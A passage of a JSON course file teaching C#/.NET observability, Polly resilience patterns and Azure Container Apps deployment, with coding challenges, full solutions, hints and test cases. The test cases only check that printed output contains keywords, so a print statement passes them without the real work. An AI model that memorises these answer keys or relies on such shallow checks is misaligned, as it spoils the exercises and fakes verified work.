AddToCart spans with product details\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should confirm observability implementation",
                  "expectedOutput": "CartService",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should mention metrics",
                  "expectedOutput": "Metrics",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "CreateCounter, CreateHistogram, CreateUpDownCounter from Meter. Pass name and optional description."
                },
                {
                  "level": 2,
                  "text": "Counter.Add(1, tag) - second parameter is KeyValuePair for tags. Tags enable filtering in dashboards."
                },
                {
                  "level": 3,
                  "text": "Structured logging: LogInformation(\"Message {Prop}\", value) - curly braces are placeholders, not string interpolation!"
                },
                {
                  "level": 4,
                  "text": "ActivitySource.StartActivity returns Activity?. Use null-conditional: activity?.SetTag(...)"
                },
                {
                  "level": 5,
                  "text": "Wrap activity in 'using' statement - it auto-completes the span when disposed."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "String interpolation in log messages",
                  "consequence": "_logger.LogInformation($\"Order {orderId}\") - string is evaluated BEFORE logging! Loses structured logging benefits.",
                  "correction": "Use placeholders: _logger.LogInformation(\"Order {OrderId}\", orderId). Properties are indexed separately."
                },
                {
                  "mistake": "Forgetting to dispose activities",
                  "consequence": "Activity without 'using' stays open forever. Span never ends, traces are incomplete.",
                  "correction": "Always use 'using var activity = ...' or manually call activity.Dispose()."
                },
                {
                  "mistake": "Too many metrics/tags",
                  "consequence": "High cardinality (unique combinations) explodes storage. user_id as tag = millions of time series!",
                  "correction": "Use low-cardinality tags: region, status, category. Put high-cardinality data in logs/traces instead."
                },
                {
                  "mistake": "Not checking activity for null",
                  "consequence": "StartActivity returns null if no listener! activity.SetTag() throws NullReferenceException.",
                  "correction": "Use null-conditional: activity?.SetTag(...). Or check if (activity != null) first."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-16-04",
          "title": "Resilience Patterns (Polly, Circuit Breakers)",
          "moduleId": "module-16",
          "order": 4,
          "estimatedMinutes": 25,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're calling a friend who's not answering. What do you do?\n\nBAD APPROACH: Keep calling every second for an hour. You waste time, annoy them, and their phone overheats!\n\nGOOD APPROACH (Resilience Patterns):\n\n1. RETRY: Try 3 times with pauses between\n   Call... wait 1 sec... call... wait 2 sec... call\n\n2. CIRCUIT BREAKER: Stop trying temporarily\n   After 5 failures: 'Phone is probably dead, wait 30 seconds'\n   Like an electrical circuit breaker - prevents damage!\n\n3. TIMEOUT: Don't wait forever\n   'If no answer in 10 seconds, hang up'\n\n4. FALLBACK: Have a backup plan\n   'If call fails, send a text instead'\n\n5. BULKHEAD: Limit concurrent attempts\n   'Only make 5 calls at once, queue the rest'\n\nPOLLY: .NET library for all these patterns!\n- Fluent API to define policies\n- Compose multiple strategies\n- Built into Aspire via AddStandardResilienceHandler()\n\nASPIRE DEFAULT: Retry + Circuit Breaker + Timeout combined!\n\nThink: 'Resilience patterns are like defensive driving - expect things to go wrong and be prepared!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== ASPIRE'S BUILT-IN RESILIENCE =====\n// In ServiceDefaults, this is already configured!\n\nbuilder.Services.ConfigureHttpClientDefaults(http =>\n{\n    // AddStandardResilienceHandler adds:\n    // - Retry (3 attempts with exponential backoff)\n    // - Circuit breaker (opens after failures)\n    // - Timeout (30 seconds total)\n    // - Rate limiter (prevents overload)\n    http.AddStandardResilienceHandler();\n});\n\n// ===== CUSTOM POLLY POLICIES =====\n// Install: Microsoft.Extensions.Http.Resilience (included in Aspire)\n\nusing Microsoft.Extensions.Http.Resilience;\nusing Polly;\n\n// Configure custom resilience for specific client\nbuilder.Services.AddHttpClient<PaymentApiClient>(client =>\n{\n    client.BaseAddress = new Uri(\"http://payment-api\");\n})\n.AddResilienceHandler(\"PaymentRetry\", builder =>\n{\n    // RETRY: Try 5 times with exponential backoff\n    builder.AddRetry(new HttpRetryStrategyOptions\n    {\n        MaxRetryAttempts = 5,\n        Delay = TimeSpan.FromMilliseconds(500),\n        BackoffType = DelayBackoffType.Exponential,\n        UseJitter = true,  // Randomize delays to avoid thundering herd\n        ShouldHandle = new PredicateBuilder<HttpResponseMessage>()\n            .Handle<HttpRequestException>()\n            .HandleResult(r => r.StatusCode == System.Net.HttpStatusCode.ServiceUnavailable)\n    });\n    \n    // CIRCUIT BREAKER: Open after 3 failures\n    builder.AddCircuitBreaker(new HttpCircuitBreakerStrategyOptions\n    {\n        FailureRatio = 0.5,           // 50% failure rate\n        SamplingDuration = TimeSpan.FromSeconds(10),\n        MinimumThroughput = 3,        // Need 3 requests to evaluate\n        BreakDuration = TimeSpan.FromSeconds(30)\n    });\n    \n    // TIMEOUT: 10 second limit per request\n    builder.AddTimeout(TimeSpan.FromSeconds(10));\n});\n\n// ===== USING POLLY DIRECTLY =====\nusing Polly;\nusing Polly.Retry;\nusing Polly.CircuitBreaker;\nusing Polly.Timeout;\n\npublic class ResilientService\n{\n    private readonly ResiliencePipeline _pipeline;\n    private readonly ILogger<ResilientService> _logger;\n    \n    public ResilientService(ILogger<ResilientService> logger)\n    {\n        _logger = logger;\n        \n        // Build a resilience pipeline\n        _pipeline = new ResiliencePipelineBuilder()\n            .AddRetry(new RetryStrategyOptions\n            {\n                MaxRetryAttempts = 3,\n                Delay = TimeSpan.FromSeconds(1),\n                OnRetry = args =>\n                {\n                    _logger.LogWarning(\n                        \"Retry attempt {Attempt} after {Delay}ms\",\n                        args.AttemptNumber,\n                        args.RetryDelay.TotalMilliseconds);\n                    return ValueTask.CompletedTask;\n                }\n            })\n            .AddCircuitBreaker(new CircuitBreakerStrategyOptions\n            {\n                FailureRatio = 0.5,\n                SamplingDuration = TimeSpan.FromSeconds(10),\n                BreakDuration = TimeSpan.FromSeconds(30),\n                OnOpened = args =>\n                {\n                    _logger.LogError(\"Circuit OPENED! Service unavailable.\");\n                    return ValueTask.CompletedTask;\n                },\n                OnClosed = args =>\n                {\n                    _logger.LogInformation(\"Circuit CLOSED. Service recovered.\");\n                    return ValueTask.CompletedTask;\n                }\n            })\n            .AddTimeout(TimeSpan.FromSeconds(5))\n            .Build();\n    }\n    \n    public async Task<string> CallExternalServiceAsync()\n    {\n        // Execute with resilience\n        return await _pipeline.ExecuteAsync(async token =>\n        {\n            // Your actual operation here\n            await Task.Delay(100, token);  // Simulate work\n            return \"Success!\";\n        });\n    }\n}\n\n// ===== CIRCUIT BREAKER STATES =====\n// CLOSED: Normal operation, requests flow through\n// OPEN: Failures exceeded threshold, requests fail fast\n// HALF-OPEN: Testing if service recovered, limited requests\n\n// CLOSED -> (failures) -> OPEN -> (wait) -> HALF-OPEN -> (success) -> CLOSED\n//                                                     -> (failure) -> OPEN\n\nConsole.WriteLine(\"Resilience patterns configured!\");\nConsole.WriteLine(\"Retry: 3 attempts with exponential backoff\");\nConsole.WriteLine(\"Circuit Breaker: Opens after 50% failures\");\nConsole.WriteLine(\"Timeout: 5 second limit\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`AddStandardResilienceHandler()`**: Aspire's one-liner for production-ready resilience. Adds retry, circuit breaker, timeout, and rate limiting with sensible defaults.\n\n**`AddResilienceHandler(name, builder => {...})`**: Custom resilience for specific HttpClient. Chain .AddRetry(), .AddCircuitBreaker(), .AddTimeout() in the builder.\n\n**`BackoffType.Exponential`**: Each retry waits longer: 500ms, 1s, 2s, 4s... Prevents hammering a struggling service. Add UseJitter=true to randomize.\n\n**`FailureRatio + MinimumThroughput`**: Circuit breaker opens when FailureRatio (e.g., 50%) of requests fail, but only after MinimumThroughput requests. Prevents opening on 1 failure.\n\n**`ResiliencePipelineBuilder`**: Polly's fluent builder for composing strategies. Build() creates an immutable pipeline. Execute() runs code through the pipeline.\n\n**`OnRetry, OnOpened, OnClosed callbacks`**: Hooks for logging, metrics, alerts. Know when resilience kicks in! Returns ValueTask for async support."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Resilience Mistakes to Avoid\n\n**Strategy Order Matters**: `AddCircuitBreaker().AddRetry()` means the circuit evaluates BEFORE retries - each attempt counts as a separate call! Usually use `AddRetry().AddCircuitBreaker().AddTimeout()` so retries happen within circuit evaluation.\n\n**Too Aggressive Retries**: 10 retries with 100ms delay = hammering a dying service for 1 second. Use exponential backoff, jitter, and reasonable limits (3-5 max). Give services time to recover!\n\n**Circuit Breaker Too Sensitive**: `MinimumThroughput=1` means ONE failure opens the circuit! Set MinimumThroughput to 5-10+ for statistical significance. Brief glitches shouldn't trigger circuit opens.\n\n**Forgetting Status Code Handling**: Default retry only handles network exceptions. Server returning 503 (Service Unavailable) won't retry! Use `ShouldHandle` with `PredicateBuilder` to include specific HTTP status codes.\n\n**Timeout vs Total Timeout**: Polly's timeout is PER ATTEMPT. With 3 retries and 10s timeout, total could be 30+ seconds! Consider using both per-attempt and total pipeline timeouts.\n\n**Hiding Failures**: Resilience makes failures invisible if you don't log. Always use `OnRetry`, `OnOpened` callbacks to track when resilience activates - these are important signals!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-16-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Configure resilience for an external weather API client!\n\n1. Create WeatherApiClient with HttpClient injection\n\n2. Configure resilience with:\n   - Retry: 4 attempts, 200ms initial delay, exponential backoff with jitter\n   - Circuit Breaker: Opens at 30% failure rate, 5 request minimum, 20 second break\n   - Timeout: 8 seconds per request\n\n3. Add OnRetry callback that logs the attempt number\n\n4. Handle specific HTTP status codes:\n   - Retry on 503 (Service Unavailable)\n   - Retry on 429 (Too Many Requests)\n\nUse AddResilienceHandler with custom configuration!",
              "starterCode": "using Microsoft.Extensions.Http.Resilience;\nusing Polly;\n\npublic class WeatherApiClient\n{\n    private readonly HttpClient _httpClient;\n    \n    public WeatherApiClient(HttpClient httpClient)\n    {\n        _httpClient = httpClient;\n    }\n    \n    public async Task<WeatherData?> GetWeatherAsync(string city)\n    {\n        var response = await _httpClient.GetAsync($\"/api/weather/{city}\");\n        response.EnsureSuccessStatusCode();\n        return await response.Content.ReadFromJsonAsync<WeatherData>();\n    }\n}\n\npublic record WeatherData(string City, double Temperature, string Conditions);\n\n// Configure the HttpClient with resilience\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddHttpClient<WeatherApiClient>(client =>\n{\n    client.BaseAddress = new Uri(\"http://weather-api\");\n})\n// TODO: Add resilience handler with:\n// - Retry (4 attempts, 200ms delay, exponential, jitter)\n// - Circuit breaker (30% failure, 5 min throughput, 20s break)\n// - Timeout (8 seconds)\n;\n\nConsole.WriteLine(\"Configure resilience for WeatherApiClient!\");",
              "solution": "using Microsoft.Extensions.Http.Resilience;\nusing Polly;\nusing System.Net;\n\npublic class WeatherApiClient\n{\n    private readonly HttpClient _httpClient;\n    \n    public WeatherApiClient(HttpClient httpClient)\n    {\n        _httpClient = httpClient;\n    }\n    \n    public async Task<WeatherData?> GetWeatherAsync(string city)\n    {\n        var response = await _httpClient.GetAsync($\"/api/weather/{city}\");\n        response.EnsureSuccessStatusCode();\n        return await response.Content.ReadFromJsonAsync<WeatherData>();\n    }\n}\n\npublic record WeatherData(string City, double Temperature, string Conditions);\n\n// Configure the HttpClient with resilience\nvar builder = WebApplication.CreateBuilder(args);\n\nbuilder.Services.AddHttpClient<WeatherApiClient>(client =>\n{\n    client.BaseAddress = new Uri(\"http://weather-api\");\n})\n.AddResilienceHandler(\"WeatherResilience\", pipeline =>\n{\n    // RETRY: 4 attempts with exponential backoff + jitter\n    pipeline.AddRetry(new HttpRetryStrategyOptions\n    {\n        MaxRetryAttempts = 4,\n        Delay = TimeSpan.FromMilliseconds(200),\n        BackoffType = DelayBackoffType.Exponential,\n        UseJitter = true,\n        ShouldHandle = new PredicateBuilder<HttpResponseMessage>()\n            .Handle<HttpRequestException>()\n            .HandleResult(r => r.StatusCode == HttpStatusCode.ServiceUnavailable)\n            .HandleResult(r => r.StatusCode == HttpStatusCode.TooManyRequests),\n        OnRetry = args =>\n        {\n            Console.WriteLine($\"Retry attempt {args.AttemptNumber} after {args.RetryDelay.TotalMilliseconds}ms\");\n            return ValueTask.CompletedTask;\n        }\n    });\n    \n    // CIRCUIT BREAKER: 30% failure rate threshold\n    pipeline.AddCircuitBreaker(new HttpCircuitBreakerStrategyOptions\n    {\n        FailureRatio = 0.3,  // 30%\n        SamplingDuration = TimeSpan.FromSeconds(10),\n        MinimumThroughput = 5,\n        BreakDuration = TimeSpan.FromSeconds(20),\n        OnOpened = args =>\n        {\n            Console.WriteLine(\"Circuit breaker OPENED - weather service unavailable\");\n            return ValueTask.CompletedTask;\n        }\n    });\n    \n    // TIMEOUT: 8 seconds max\n    pipeline.AddTimeout(TimeSpan.FromSeconds(8));\n});\n\nConsole.WriteLine(\"WeatherApiClient resilience configured!\");\nConsole.WriteLine(\"Retry: 4 attempts, exponential backoff (200ms base), jitter enabled\");\nConsole.WriteLine(\"Circuit Breaker: 30% failure ratio, 20s break duration\");\nConsole.WriteLine(\"Timeout: 8 seconds per request\");\nConsole.WriteLine(\"Handles: HttpRequestException, 503, 429\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should confirm resilience configuration",
                  "expectedOutput": "WeatherApiClient",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should mention retry configuration",
                  "expectedOutput": "Retry",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": ".AddResilienceHandler('name', pipeline => {...}) chains after AddHttpClient. Pipeline is a builder."
                },
                {
                  "level": 2,
                  "text": "HttpRetryStrategyOptions: MaxRetryAttempts, Delay (initial), BackoffType, UseJitter, ShouldHandle, OnRetry."
                },
                {
                  "level": 3,
                  "text": "PredicateBuilder<HttpResponseMessage>().HandleResult(r => r.StatusCode == ...) for specific status codes."
                },
                {
                  "level": 4,
                  "text": "HttpCircuitBreakerStrategyOptions: FailureRatio (0-1), MinimumThroughput, BreakDuration, OnOpened/OnClosed."
                },
                {
                  "level": 5,
                  "text": "Order matters! Retry inside circuit breaker: pipeline.AddRetry().AddCircuitBreaker(). Retries happen before circuit evaluation."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Wrong strategy order",
                  "consequence": "AddCircuitBreaker().AddRetry() means circuit opens BEFORE retries happen. Each retry is counted separately!",
                  "correction": "Usually: AddRetry().AddCircuitBreaker().AddTimeout(). Outer strategies wrap inner ones."
                },
                {
                  "mistake": "Too aggressive retry",
                  "consequence": "MaxRetryAttempts=10 with 100ms delay = hammering dying service. Makes problems worse!",
                  "correction": "Use exponential backoff, reasonable limits (3-5 retries), and jitter. Give service time to recover."
                },
                {
                  "mistake": "Circuit breaker too sensitive",
                  "consequence": "MinimumThroughput=1, FailureRatio=0.5 means ONE failure opens circuit! False positives everywhere.",
                  "correction": "Set MinimumThroughput high enough (5-10+) for statistical significance. Brief glitches won't trigger."
                },
                {
                  "mistake": "Forgetting to handle specific status codes",
                  "consequence": "Default only retries on network exceptions. 503/429 from server won't retry!",
                  "correction": "Use ShouldHandle with PredicateBuilder to include specific HTTP status codes for retry."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-16-05",
          "title": "Deploying to Azure Container Apps",
          "moduleId": "module-16",
          "order": 5,
          "estimatedMinutes": 20,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "You've built your orchestra (Aspire app) and rehearsed locally. Now it's time for the REAL CONCERT - production deployment!\n\nLOCAL DEVELOPMENT:\n- Containers run on your machine\n- Dashboard at localhost:18888\n- Redis/Postgres in Docker\n\nPRODUCTION (Azure Container Apps):\n- Containers run in Azure's cloud\n- Auto-scaling based on load\n- Managed Redis (Azure Cache)\n- Managed Postgres (Azure Database)\n- Built-in HTTPS, load balancing\n\nAZURE CONTAINER APPS (ACA):\n- Serverless containers - pay for what you use\n- Automatic scaling (0 to many instances)\n- Built-in service discovery (works with Aspire!)\n- No Kubernetes complexity\n\nDEPLOYMENT OPTIONS:\n1. Azure Developer CLI (azd) - Recommended!\n2. Visual Studio Publish\n3. CI/CD pipelines (GitHub Actions)\n\nASPIRE + ACA = Perfect Match:\n- Aspire manifest describes your app\n- azd reads manifest, creates Azure resources\n- Connection strings auto-configured\n- Same code, different environment!\n\nThink: 'Aspire is the blueprint, Azure Container Apps is the construction site!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== STEP 1: Prepare Your AppHost =====\n// AppHost/Program.cs - Production-ready configuration\n\nvar builder = DistributedApplication.CreateBuilder(args);\n\n// Infrastructure - Aspire maps these to Azure services\nvar cache = builder.AddRedis(\"cache\");\nvar db = builder.AddPostgres(\"postgres\")\n    .AddDatabase(\"catalogdb\");\n\n// Services\nvar api = builder.AddProject<Projects.CatalogApi>(\"api\")\n    .WithReference(cache)\n    .WithReference(db)\n    .WithExternalHttpEndpoints();  // Expose to internet\n\nbuilder.AddProject<Projects.WebApp>(\"webapp\")\n    .WithReference(api)\n    .WithExternalHttpEndpoints();\n\nbuilder.Build().Run();\n\n// ===== STEP 2: Initialize Azure Developer CLI =====\n// Run in terminal (from solution folder):\n\n// Initialize azd (one time)\n// > azd init\n//   - Creates azure.yaml\n//   - Creates .azure/ folder\n\n// ===== azure.yaml (auto-generated) =====\n// name: my-aspire-app\n// services:\n//   app:\n//     project: ./MyApp.AppHost/MyApp.AppHost.csproj\n//     host: containerapp\n\n// ===== STEP 3: Deploy! =====\n// > azd up\n//\n// This command:\n// 1. Builds all your projects as containers\n// 2. Creates Azure Container Registry\n// 3. Pushes containers to registry\n// 4. Creates Azure Container Apps Environment\n// 5. Creates managed Redis (Azure Cache for Redis)\n// 6. Creates managed Postgres (Azure Database)\n// 7. Deploys your containers\n// 8. Configures networking/service discovery\n// 9. Sets up connection strings\n\n// ===== STEP 4: Environment Configuration =====\n// appsettings.Production.json - Override for production\n{\n    \"Logging\": {\n        \"LogLevel\": {\n            \"Default\": \"Warning\",\n            \"Microsoft.Hosting.Lifetime\": \"Information\"\n        }\n    }\n}\n\n// ===== STEP 5: GitHub Actions CI/CD =====\n// .github/workflows/deploy.yml\n\n// name: Deploy to Azure\n// \n// on:\n//   push:\n//     branches: [main]\n// \n// jobs:\n//   deploy:\n//     runs-on: ubuntu-latest\n//     steps:\n//       - uses: actions/checkout@v4\n//       \n//       - name: Install azd\n//         uses: Azure/setup-azd@v1\n//       \n//       - name: Log in with Azure (federated)\n//         run: azd auth login --no-prompt\n//         env:\n//           AZURE_CLIENT_ID: ${{ vars.AZURE_CLIENT_ID }}\n//           AZURE_TENANT_ID: ${{ vars.AZURE_TENANT_ID }}\n//           AZURE_SUBSCRIPTION_ID: ${{ vars.AZURE_SUBSCRIPTION_ID }}\n//       \n//       - name: Deploy\n//         run: azd up --no-prompt\n//         env:\n//           AZURE_ENV_NAME: ${{ vars.AZURE_ENV_NAME }}\n\n// ===== USEFUL AZD COMMANDS =====\n// azd init          - Initialize project\n// azd up            - Deploy everything\n// azd deploy        - Deploy code only (faster)\n// azd down          - Delete all Azure resources\n// azd monitor       - Open Azure Portal monitoring\n// azd env list      - List environments (dev, staging, prod)\n// azd env select    - Switch environment\n\n// ===== ASPIRE MANIFEST =====\n// Aspire generates a manifest.json describing your app\n// Run: dotnet run --project AppHost -- --publisher manifest\n\nConsole.WriteLine(\"Deployment steps:\");\nConsole.WriteLine(\"1. azd init      - Initialize Azure config\");\nConsole.WriteLine(\"2. azd up        - Deploy to Azure!\");\nConsole.WriteLine(\"3. azd monitor   - View in Azure Portal\");\nConsole.WriteLine(\"\");\nConsole.WriteLine(\"Aspire maps to Azure services:\");\nConsole.WriteLine(\"  AddRedis -> Azure Cache for Redis\");\nConsole.WriteLine(\"  AddPostgres -> Azure Database for PostgreSQL\");\nConsole.WriteLine(\"  AddProject -> Azure Container App\");",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`.WithExternalHttpEndpoints()`**: Marks a service as internet-facing. Azure Container Apps will create a public URL. Without this, service is internal only.\n\n**`azd init`**: Creates azure.yaml and .azure/ folder. Scans your solution, detects Aspire AppHost, generates deployment config. Run once per project.\n\n**`azd up`**: The magic command! Provisions Azure resources, builds containers, deploys everything. First run creates resources, subsequent runs update.\n\n**`azure.yaml`**: Deployment descriptor. Points to AppHost project. azd reads this to understand your app structure.\n\n**`azd env`**: Manage multiple environments (dev, staging, prod). Each environment has separate Azure resources. Switch with 'azd env select'.\n\n**`azd down`**: Cleanup! Deletes ALL Azure resources for the environment. Use carefully - data is lost! Great for dev environments to save costs."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Deployment Disasters to Avoid\n\n**azd down Destroys EVERYTHING**: Running `azd down` deletes ALL Azure resources including databases with your data! Only use for dev/test environments. Production cleanup should be manual and deliberate.\n\n**External Endpoints = Public Internet**: `.WithExternalHttpEndpoints()` exposes services to the ENTIRE internet. Only add this to services that genuinely need public access (web frontends, public APIs). Keep internal services internal!\n\n**Cost Awareness**: Azure Container Apps charges for compute, storage, and managed services. Running `azd up` creates billable resources immediately. Use `azd down` for dev environments when not in use.\n\n**Secrets in Source Control**: Never commit azure.yaml with secrets or .azure/ folder with credentials to git. Add `.azure/` to .gitignore. Use Azure Key Vault for sensitive configuration.\n\n**Environment Confusion**: `azd env` manages multiple environments. Double-check which environment is selected before running `azd up` or `azd down`. Wrong environment = wrong deployment or data loss!\n\n**Connection String Differences**: Local Aspire uses container connection strings. Production uses Azure managed service connection strings. Test thoroughly in staging before production - connection behavior may differ."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-16-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Prepare an AppHost for Azure deployment!\n\n1. Configure the following services:\n   - Redis cache named 'appcache'\n   - PostgreSQL database named 'appdb'\n   - Background worker service (internal only)\n   - Public API service (external endpoints)\n   - Public web frontend (external endpoints)\n\n2. Set up dependencies:\n   - Worker needs cache and database\n   - API needs cache and database\n   - Web needs to call API\n\n3. Add comments explaining:\n   - Which services are public vs internal\n   - What Azure resources each maps to\n\n4. Print deployment instructions",
              "starterCode": "// Production-Ready AppHost for Azure Container Apps\n\nvar builder = DistributedApplication.CreateBuilder(args);\n\n// ===== INFRASTRUCTURE =====\n// TODO: Add Redis cache (maps to Azure Cache for Redis)\n\n// TODO: Add PostgreSQL database (maps to Azure Database for PostgreSQL)\n\n// ===== SERVICES =====\n// TODO: Add background worker (INTERNAL - no external endpoints)\n//       Needs: cache, database\n\n// TODO: Add API service (EXTERNAL - public endpoint)\n//       Needs: cache, database\n\n// TODO: Add web frontend (EXTERNAL - public endpoint)\n//       Needs: API reference\n\nbuilder.Build().Run();\n\n// Print deployment guide\nConsole.WriteLine(\"AppHost configured for Azure!\");",
              "solution": "// Production-Ready AppHost for Azure Container Apps\n\nvar builder = DistributedApplication.CreateBuilder(args);\n\n// ===== INFRASTRUCTURE =====\n// Redis cache - maps to Azure Cache for Redis (managed)\nvar cache = builder.AddRedis(\"appcache\");\n\n// PostgreSQL - maps to Azure Database for PostgreSQL (managed)\nvar db = builder.AddPostgres(\"postgres\")\n    .AddDatabase(\"appdb\");\n\n// ===== SERVICES =====\n\n// Background worker - INTERNAL only (no WithExternalHttpEndpoints)\n// Processes jobs from database, updates cache\n// Maps to: Azure Container App (internal ingress only)\nvar worker = builder.AddProject<Projects.BackgroundWorker>(\"worker\")\n    .WithReference(cache)\n    .WithReference(db);\n\n// API service - EXTERNAL (public internet access)\n// Serves REST endpoints for web and mobile clients\n// Maps to: Azure Container App (external ingress + public URL)\nvar api = builder.AddProject<Projects.PublicApi>(\"api\")\n    .WithReference(cache)\n    .WithReference(db)\n    .WithExternalHttpEndpoints();  // Creates public URL\n\n// Web frontend - EXTERNAL (public internet access)\n// Server-side rendered web app, calls API via service discovery\n// Maps to: Azure Container App (external ingress + public URL)\nbuilder.AddProject<Projects.WebFrontend>(\"web\")\n    .WithReference(api)  // Service discovery to API\n    .WithExternalHttpEndpoints();  // Creates public URL\n\nbuilder.Build().Run();\n\n// Print deployment guide\nConsole.WriteLine(\"AppHost configured for Azure Container Apps!\");\nConsole.WriteLine(\"\");\nConsole.WriteLine(\"Infrastructure (managed Azure services):\");\nConsole.WriteLine(\"  - appcache -> Azure Cache for Redis\");\nConsole.WriteLine(\"  - appdb    -> Azure Database for PostgreSQL\");\nConsole.WriteLine(\"\");\nConsole.WriteLine(\"Services (Azure Container Apps):\");\nConsole.WriteLine(\"  - worker   -> Internal (background processing)\");\nConsole.WriteLine(\"  - api      -> External (public REST API)\");\nConsole.WriteLine(\"  - web      -> External (public website)\");\nConsole.WriteLine(\"\");\nConsole.WriteLine(\"Deploy with:\");\nConsole.WriteLine(\"  1. azd init\");\nConsole.WriteLine(\"  2. azd up\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should confirm Azure configuration",
                  "expectedOutput": "Azure",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should mention deployment commands",
                  "expectedOutput": "azd",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": ".WithExternalHttpEndpoints() marks a service as internet-facing. Without it, service is internal only."
                },
                {
                  "level": 2,
                  "text": "Background workers typically don't need external endpoints - they process internal jobs."
                },
                {
                  "level": 3,
                  "text": "Store infrastructure in variables (var cache = ...) to pass to .WithReference() calls."
                },
                {
                  "level": 4,
                  "text": "Order of AddProject doesn't matter for dependencies - just use .WithReference() correctly."
                },
                {
                  "level": 5,
                  "text": "Comments help others (and future you) understand the deployment architecture!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Making everything external",
                  "consequence": "All services get public URLs! Security risk - internal services exposed to internet.",
                  "correction": "Only add .WithExternalHttpEndpoints() to services that need public access (web, public API)."
                },
                {
                  "mistake": "Forgetting database reference for workers",
                  "consequence": "Worker can't connect to database! Connection string not injected.",
                  "correction": "Use .WithReference(db) for every service that needs database access."
                },
                {
                  "mistake": "Not understanding azd down",
                  "consequence": "'azd down' deletes EVERYTHING including databases! Data loss in production!",
                  "correction": "Use azd down for dev/test only. Production cleanup should be manual and careful."
                },
                {
                  "mistake": "Hardcoding production URLs",
                  "consequence": "new Uri('https://myapp.azurecontainerapps.io') breaks in other environments!",
                  "correction": "Use service discovery (http://service-name). Aspire + Azure handles the real URLs."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        }
      ]
    },
    {
      "id": "module-17",
      "title": "Native AOT and Performance Optimization",
      "description": "Build lightning-fast applications with Native AOT compilation. Learn trimming, source generators, and performance profiling for minimal deployments.",
      "difficulty": "advanced",
      "estimatedHours": 2,
      "lessons": [
        {
          "id": "lesson-17-01",
          "title": "What is Native AOT? (No JIT Required!)",
          "moduleId": "module-17",
          "order": 1,
          "estimatedMinutes": 25,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're a chef who speaks only French, cooking for English-speaking customers. You have TWO options:\n\nTRADITIONAL WAY (JIT - Just-In-Time):\n- Hire a translator who stands in the kitchen\n- Every time you say something, translator converts it live\n- Works great, but there's always a slight delay\n- Translator needs space and resources\n\nNATIVE AOT WAY (Ahead-Of-Time):\n- Before opening the restaurant, translate ALL your recipes to English\n- Print them in a cookbook\n- No translator needed at runtime!\n- Faster service, smaller kitchen staff\n\n.NET COMPILATION EXPLAINED:\n\nNORMAL .NET:\n1. C# code -> IL (Intermediate Language)\n2. IL ships with your app\n3. JIT compiles IL to machine code AT RUNTIME\n4. First call is slow (compilation), subsequent calls are fast\n\nNATIVE AOT:\n1. C# code -> IL -> Native machine code\n2. Machine code ships with your app\n3. NO JIT needed at runtime!\n4. Instant startup, smaller memory footprint\n\nTRADEOFFS:\n- Pro: Lightning-fast startup (great for serverless, CLI tools)\n- Pro: Smaller memory footprint\n- Pro: Single file deployment\n- Con: Larger file size\n- Con: No runtime code generation\n- Con: Some reflection limitations\n\nThink: 'Native AOT is like compiling your recipe book before opening the restaurant - slower to prepare, but faster to serve!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
